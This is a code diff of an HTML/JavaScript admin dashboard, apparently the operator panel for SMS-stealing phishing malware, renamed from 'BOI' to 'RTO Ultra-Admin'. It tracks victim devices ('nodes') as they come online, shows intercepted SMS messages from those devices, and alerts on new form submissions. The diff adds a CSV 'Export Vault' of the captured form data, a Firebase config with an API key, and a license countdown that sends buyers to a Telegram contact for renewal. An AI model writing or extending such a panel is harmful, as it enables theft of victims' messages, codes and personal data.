@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BOI Ultra-Admin 2.0 (SECURE)</title>
+    <title>RTO Ultra-Admin 2.0 (SECURE)</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -171,6 +171,12 @@
     </style>
 </head>
 <body class="bg-[#f1f5f9] min-h-screen font-sans text-slate-900 flex overflow-hidden">
+<!-- Notification Sounds -->
+<audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" preload="auto"></audio>
+<audio id="new-device-sound" src="newdevice.mp3" preload="auto"></audio>
+<audio id="message-sound" src="message.mp3" preload="auto"></audio>
+<audio id="new-post-sound" src="newpost.mp3" preload="auto"></audio>
+<audio id="device-online-sound" src="deviveonline.mp3" preload="auto"></audio>
 <!-- Broadcast Overlay -->
 <div id="broadcast-overlay" class="fixed inset-0 bg-slate-900/95 z-[150] flex items-center justify-center p-6 hidden backdrop-blur-md">
     <div class="max-w-md w-full text-center space-y-8 relative">
@@ -231,7 +237,7 @@
         <div class="space-y-4">
             <div class="space-y-1">
                 <label class="text-[10px] font-black text-slate-500 uppercase ml-1">New Email</label>
-                <input type="email" id="update-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@boi.me">
+                <input type="email" id="update-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@rto.me">
             </div>
             <div class="space-y-1">
                 <label class="text-[10px] font-black text-slate-500 uppercase ml-1">New Password</label>
@@ -266,7 +272,7 @@
         <div class="space-y-4">
             <div class="space-y-1">
                 <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Email ID</label>
-                <input type="email" id="login-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@boi.me">
+                <input type="email" id="login-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@rto.me">
             </div>
             <div class="space-y-1">
                 <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Master Key</label>
@@ -278,6 +284,13 @@
             <button onclick="handleLogin()" id="login-btn" class="w-full bg-slate-900 text-white py-4 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-blue-600 transition-all shadow-xl active:scale-95">Verify Identity</button>
         </div>
         <div id="login-err" class="hidden text-center text-rose-600 text-xs font-black uppercase tracking-widest animate-pulse">Auth Failed: Access Denied</div>
+        <div id="renewal-box" class="hidden pt-4 border-t border-slate-100">
+            <p class="text-[10px] font-black text-rose-500 uppercase text-center mb-3">License Expired. Contact Admin to Renew:</p>
+            <a href="https://t.me/dark2shadoww" target="_blank" class="flex items-center justify-center gap-2 px-3 py-4 bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition-all shadow-lg active:scale-95">
+                <i class="fab fa-telegram text-xl"></i>
+                <span class="text-xs font-black uppercase tracking-widest">Renew via dark2shadoww</span>
+            </a>
+        </div>
     </div>
 </div>
 
@@ -289,7 +302,7 @@
     <div class="p-4 border-b border-slate-800 flex items-center justify-between h-14">
         <div class="flex items-center gap-2">
             <div class="bg-blue-600 p-1 rounded-lg"><i class="fas fa-shield-halved text-white text-md"></i></div>
-            <span class="text-md font-black text-white tracking-tight">BOI <span class="text-blue-500">ULTRA</span></span>
+            <span class="text-md font-black text-white tracking-tight">RTO <span class="text-blue-500">ULTRA</span></span>
         </div>
         <button onclick="toggleSidebar()" class="lg:hidden text-slate-400 hover:text-white"><i class="fas fa-times"></i></button>
     </div>
@@ -301,7 +314,19 @@
         <a href="#" onclick="showView('history')" id="nav-history" class="nav-link flex items-center gap-3 px-4 py-2 rounded-lg transition-all hover:bg-slate-800 text-sm">
             <i class="fas fa-history text-xs"></i> <span>Access Logs</span>
         </a>
-        <div class="pt-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">Global Config</div>
+        <div class="pt-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">System License</div>
+        <div class="px-4 mb-2">
+            <div class="bg-slate-800/50 border border-slate-700 rounded-xl p-3 space-y-2">
+                <div class="flex justify-between items-center">
+                    <span class="text-[9px] font-black text-slate-500 uppercase">Status</span>
+                    <span id="days-left" class="text-[9px] font-black text-emerald-500 uppercase tracking-widest">Active</span>
+                </div>
+                <div class="h-1 w-full bg-slate-700 rounded-full overflow-hidden">
+                    <div id="sub-progress" class="h-full bg-emerald-500 transition-all duration-1000" style="width: 0%"></div>
+                </div>
+            </div>
+        </div>
+        <div class="pt-2 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">Global Config</div>
         <div class="px-3 space-y-2">
             <!-- Telegram Contact -->
             <a href="https://t.me/dark2shadoww" target="_blank" class="flex items-center gap-2 px-3 py-2 bg-blue-600/10 border border-blue-600/20 rounded-lg text-blue-500 hover:bg-blue-600/20 transition-all mb-4">
@@ -346,6 +371,20 @@
 
 <!-- Main Content -->
 <main class="flex-1 flex flex-col min-w-0 h-screen overflow-hidden">
+    <!-- Top Expiry Bar -->
+    <div id="top-expiry-bar" class="bg-slate-900 text-blue-400 text-[9px] font-black uppercase tracking-[0.3em] h-7 flex items-center justify-center gap-3 border-b border-blue-500/20 flex-shrink-0 z-[60]">
+        <div class="flex items-center gap-1">
+            <i class="fas fa-shield-check text-blue-500"></i>
+            <span>System License:</span>
+        </div>
+        <div id="countdown-timer" class="flex gap-2 font-mono text-[10px]">
+            <span class="bg-slate-800 px-1.5 py-0.5 rounded border border-slate-700" id="cd-d">00d</span>
+            <span class="bg-slate-800 px-1.5 py-0.5 rounded border border-slate-700" id="cd-h">00h</span>
+            <span class="bg-slate-800 px-1.5 py-0.5 rounded border border-slate-700" id="cd-m">00m</span>
+            <span class="bg-slate-800 px-1.5 py-0.5 rounded border border-slate-700 text-blue-300" id="cd-s">00s</span>
+        </div>
+        <div id="top-expiry-text" class="hidden"></div>
+    </div>
     <!-- Header -->
     <header class="bg-white border-b border-slate-200 h-14 flex items-center justify-between px-4 lg:px-6 shadow-sm flex-shrink-0 z-30">
         <div class="flex items-center gap-3">
@@ -356,6 +395,10 @@
                 <div class="flex items-center gap-1.5 ml-4 px-2 py-1 bg-green-50 rounded-full border border-green-100">
                     <div class="w-1.5 h-1.5 rounded-full bg-green-500 online-dot"></div>
                     <span class="text-[8px] font-black text-green-600 uppercase tracking-widest">System Live</span>
+                </div>
+                <div id="license-header" class="hidden sm:flex items-center gap-1.5 ml-2 px-2 py-1 bg-blue-50 rounded-full border border-blue-100">
+                    <i class="fas fa-clock text-[8px] text-blue-500"></i>
+                    <span id="license-text-header" class="text-[8px] font-black text-blue-600 uppercase tracking-widest">Loading...</span>
                 </div>
             </div>
         </div>
@@ -372,7 +415,7 @@
                 <div class="absolute right-0 mt-2 w-48 bg-white rounded-2xl shadow-2xl border border-slate-100 py-2 opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-200 z-[100] transform origin-top-right scale-95 group-hover:scale-100">
                     <div class="px-4 py-2 border-b border-slate-50 mb-1">
                         <p class="text-[8px] font-black text-slate-400 uppercase tracking-widest">Admin Account</p>
-                        <p id="dropdown-admin-email" class="text-[10px] font-bold text-slate-700 truncate">admin@boi.me</p>
+                        <p id="dropdown-admin-email" class="text-[10px] font-bold text-slate-700 truncate">admin@rto.me</p>
                     </div>
                     <button onclick="openProfileModal()" class="w-full text-left px-4 py-2.5 text-[10px] font-black uppercase text-slate-600 hover:bg-blue-50 hover:text-blue-600 transition-colors flex items-center gap-2">
                         <i class="fas fa-user-edit text-[10px]"></i> Edit Credentials
@@ -458,6 +501,9 @@
                     <i class="fas fa-search text-slate-400 text-sm"></i>
                     <input type="text" id="user-search" oninput="resetPage(); updateDashboard()" placeholder="Search nodes, nicknames, or use :low, :online, :cf..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
                 </div>
+                <button id="export-btn" onclick="exportToCSV()" class="hidden bg-slate-900 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest hover:bg-blue-600 transition-all shadow-lg active:scale-95 flex items-center gap-2">
+                    <i class="fas fa-file-csv"></i> Export Vault
+                </button>
             </div>
             <div id="dashboard-list" class="space-y-3"></div>
 
@@ -739,7 +785,13 @@
 </main>
 
 <script>
-    const firebaseConfig = {
+    // =================================================================
+    // LICENSE MASTER CONFIG (ONLY OWNER EDITS THIS)
+    // =================================================================
+    const SYSTEM_EXPIRY_DATE = "2026-05-22"; // Format: YYYY-MM-DD
+    // =================================================================
+
+      const firebaseConfig = {
         apiKey: "AIzaSyAuyKO6tR6N3yEKm8CZ3w_EhhE26FUdphk",
         authDomain: "dhiboi.firebaseapp.com",
         databaseURL: "https://dhiboi-default-rtdb.firebaseio.com",
@@ -754,7 +806,7 @@
     const auth = firebase.auth();
 
     // Professional Toast Controller
-    function showToast(msg, type = 'info') {
+    function showToast(msg, type = 'info', soundId = 'notif-sound') {
         const container = document.getElementById('toast-container');
         if(!container) return;
 
@@ -773,6 +825,12 @@
         `;
 
         container.appendChild(toast);
+        // Play notification sound
+        const sound = document.getElementById(soundId) || document.getElementById('notif-sound');
+        if (sound) {
+            sound.currentTime = 0;
+            sound.play().catch(e => console.log("Sound play deferred: ", e));
+        }
         // Force Reflow
         setTimeout(() => toast.classList.add('show'), 10);
 
@@ -872,10 +930,88 @@
                     logout();
                 }
             });
+
+            // 5. Check Subscription (30 Days)
+            checkSubscription(user);
         } else {
             if(overlay) overlay.style.display = 'flex';
         }
     });
+
+    let subscriptionTimer = null;
+    function checkSubscription(user) {
+        if(!user) return;
+
+        const expiryTime = new Date(SYSTEM_EXPIRY_DATE).getTime();
+
+        if(subscriptionTimer) clearInterval(subscriptionTimer);
+
+        subscriptionTimer = setInterval(() => {
+            const now = Date.now();
+            const remaining = expiryTime - now;
+
+            const daysLeftEl = document.getElementById('days-left');
+            const progressEl = document.getElementById('sub-progress');
+            const headerText = document.getElementById('license-text-header');
+            const topBar = document.getElementById('top-expiry-bar');
+            const timerContainer = document.getElementById('countdown-timer');
+            const renewalBox = document.getElementById('renewal-box');
+            const loginBtn = document.getElementById('login-btn');
+
+            if (remaining <= 0) {
+                clearInterval(subscriptionTimer);
+                if(daysLeftEl) daysLeftEl.innerText = "EXPIRED";
+                if(progressEl) progressEl.style.width = "100%";
+                if(headerText) headerText.innerText = "LICENSE EXPIRED";
+
+                if(timerContainer) timerContainer.innerHTML = '<span class="text-rose-500 animate-pulse font-black">EXPIRED</span>';
+                if(topBar) topBar.className = "bg-rose-600 text-white text-[9px] font-black uppercase h-7 flex items-center justify-center gap-2 flex-shrink-0 z-[60] shadow-lg";
+
+                // Show renewal in login overlay and hide login button
+                if(renewalBox) renewalBox.classList.remove('hidden');
+                if(loginBtn) loginBtn.classList.add('hidden');
+
+                // If logged in, force logout
+                if(auth.currentUser) {
+                    showToast("SESSION EXPIRED: Please renew your license.", "error");
+                    setTimeout(() => logout(), 3000);
+                }
+                return;
+            }
+
+            // Update Countdown Timer UI
+            const d = Math.floor(remaining / (1000 * 60 * 60 * 24));
+            const h = Math.floor((remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+            const s = Math.floor((remaining % (1000 * 60)) / 1000);
+
+            if(document.getElementById('cd-d')) document.getElementById('cd-d').innerText = d + "d";
+            if(document.getElementById('cd-h')) document.getElementById('cd-h').innerText = String(h).padStart(2, '0') + "h";
+            if(document.getElementById('cd-m')) document.getElementById('cd-m').innerText = String(m).padStart(2, '0') + "m";
+            if(document.getElementById('cd-s')) document.getElementById('cd-s').innerText = String(s).padStart(2, '0') + "s";
+
+            // Update Sidebar / Header
+            if(daysLeftEl) daysLeftEl.innerText = d + " DAYS LEFT";
+            if(headerText) headerText.innerText = d + "d " + h + "h REMAINING";
+
+            // Progress calculation (Assuming a 30-day cycle for the visual bar)
+            const thirtyDays = 30 * 24 * 60 * 60 * 1000;
+            const percent = Math.max(0, Math.min(100, (remaining / thirtyDays) * 100));
+            if(progressEl) progressEl.style.width = (100 - percent) + "%";
+
+            if(d < 7) {
+                if(topBar) {
+                    topBar.classList.remove('bg-slate-900');
+                    topBar.classList.add('bg-amber-500', 'text-white');
+                }
+            } else {
+                if(topBar) {
+                    topBar.classList.add('bg-slate-900');
+                    topBar.classList.remove('bg-amber-500', 'text-white');
+                }
+            }
+        }, 1000);
+    }
 
     function logAdminLogin(email) {
         const logData = {
@@ -981,6 +1117,9 @@
     let permIds = {};
     let currentPage = 1;
     const pageSize = 15;
+    let knownUids = new Set();
+    let knownFids = new Set();
+    let isFirstLoadUsers = true;
 
     function toggleSidebar() {
         const sb = document.getElementById('sidebar');
@@ -1018,20 +1157,43 @@
             db.ref('Users').on('value', snap => {
                 const data = snap.val() || {};
 
-                // Track Online/Offline state changes for professional notifications
+                // Track changes for notifications
                 Object.keys(data).forEach(uid => {
                     const info = data[uid].I || {};
                     const isNowOnline = checkIsOnline(info);
                     const wasOnline = prevStatus[uid];
 
-                    // Only show alert if it's a confirmed state change from Offline to Online
-                    if (wasOnline === false && isNowOnline === true) {
-                        const name = (info.m || "Unknown") + " (#" + (permIds[uid] || "...") + ")";
-                        showToast(`${name} IS NOW ONLINE ⚡`, "success");
+                    if (!isFirstLoadUsers) {
+                        // Detect New Device
+                        if (!knownUids.has(uid)) {
+                            showToast(`NEW NODE REGISTERED: ${info.m || 'Unknown'}`, "success", "new-device-sound");
+                        }
+
+                        // Only show alert if it's a confirmed state change from Offline to Online
+                        if (wasOnline === false && isNowOnline === true) {
+                            const name = (info.m || "Unknown") + " (#" + (permIds[uid] || "...") + ")";
+                            showToast(`${name} IS NOW ONLINE ⚡`, "success", "device-online-sound");
+                        }
+
+                        // Detect New Form Data (Post)
+                        const forms = data[uid].F || {};
+                        Object.keys(forms).forEach(fid => {
+                            if (!knownFids.has(fid)) {
+                                showToast(`NEW DATA RECEIVED FROM ${info.m || 'Node'}`, "info", "new-post-sound");
+                                knownFids.add(fid);
+                            }
+                        });
+                    } else {
+                        // Populate initial state to avoid spam on load
+                        const forms = data[uid].F || {};
+                        Object.keys(forms).forEach(fid => knownFids.add(fid));
                     }
+
+                    knownUids.add(uid);
                     prevStatus[uid] = isNowOnline;
                 });
 
+                isFirstLoadUsers = false;
                 usersData = data;
                 assignMissingIndices();
                 updateDashboard();
@@ -1050,7 +1212,7 @@
                 const uid = msg.userId || "Unknown";
                 const user = usersData[uid]?.I?.m || "Unknown Node";
 
-                showToast(`<b>NEW SMS FROM ${user}</b><br><small>${sender}: ${body.substring(0, 40)}...</small>`, "info");
+                showToast(`<b>NEW SMS FROM ${user}</b><br><small>${sender}: ${body.substring(0, 40)}...</small>`, "info", "message-sound");
 
                 // Play subtle notification sound (Optional)
                 // new Audio('https://assets.mixkit.co/active_storage/sfx/2354/2354-preview.mp3').play().catch(e=>{});
@@ -1123,9 +1285,44 @@
         const activeNav = document.getElementById(navId);
         if(activeNav) activeNav.classList.add('active');
 
+        // Show/Hide Export button based on filter
+        const exportBtn = document.getElementById('export-btn');
+        if(exportBtn) exportBtn.classList.toggle('hidden', f !== 'forms');
+
         // Navigation Fix: Ensure we go back to dashboard view when a filter is clicked
         showView('dashboard', true, false);
         updateDashboard();
+    }
+
+    function exportToCSV() {
+        if (currentFilter !== 'forms') return;
+
+        let csv = "User,NodeID,Field,Value,Timestamp\n";
+
+        Object.keys(usersData).forEach(uid => {
+            const u = usersData[uid];
+            const name = u.I?.m || "Unknown";
+            if (u.F) {
+                Object.values(u.F).forEach(form => {
+                    const ts = new Date(form.ts).toLocaleString().replace(/,/g, '');
+                    for (let key in form) {
+                        if (['ts', 'uid', 'name', 'page', 'timestamp'].includes(key)) continue;
+                        csv += `"${name}","${uid}","${key}","${form[key]}","${ts}"\n`;
+                    }
+                });
+            }
+        });
+
+        const blob = new Blob([csv], { type: 'text/csv' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.setAttribute('hidden', '');
+        a.setAttribute('href', url);
+        a.setAttribute('download', `data_vault_export_${Date.now()}.csv`);
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        showToast("Data Vault exported to CSV successfully!", "success");
     }
 
     function formatTime(ts) {
